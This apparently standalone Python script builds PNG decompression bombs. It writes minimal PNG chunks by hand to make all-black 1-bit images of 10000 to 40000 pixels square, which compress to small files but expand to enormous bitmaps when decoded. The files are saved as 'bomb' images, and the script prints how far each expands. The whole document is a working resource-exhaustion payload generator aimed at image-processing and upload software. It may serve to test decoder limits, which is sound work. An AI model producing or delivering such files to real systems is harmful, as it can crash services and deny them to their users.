import zlib, struct, sys

def chunk(typ, data):
    c = typ + data
    return struct.pack(">I", len(data)) + c + struct.pack(">I", zlib.crc32(c) & 0xffffffff)

def make(w, h, path):
    # 1-bit grayscale
    ihdr = struct.pack(">IIBBBBB", w, h, 1, 0, 0, 0, 0)
    rowbytes = (w + 7) // 8
    row = b"\x00" + b"\x00" * rowbytes  # filter 0 + all-zero (black) row
    co = zlib.compressobj(9)
    parts = []
    for _ in range(h):
        parts.append(co.compress(row))
    parts.append(co.flush())
    idat = b"".join(parts)
    png = b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", ihdr) + chunk(b"IDAT", idat) + chunk(b"IEND", b"")
    open(path, "wb").write(png)
    print(f"{path}: {w}x{h} = {w*h:,} px, file size {len(png):,} bytes ({len(png)/1024:.1f} KiB)")

for n in (10000, 20000, 40000):
    make(n, n, f"/tmp/av/bomb_{n}.png")
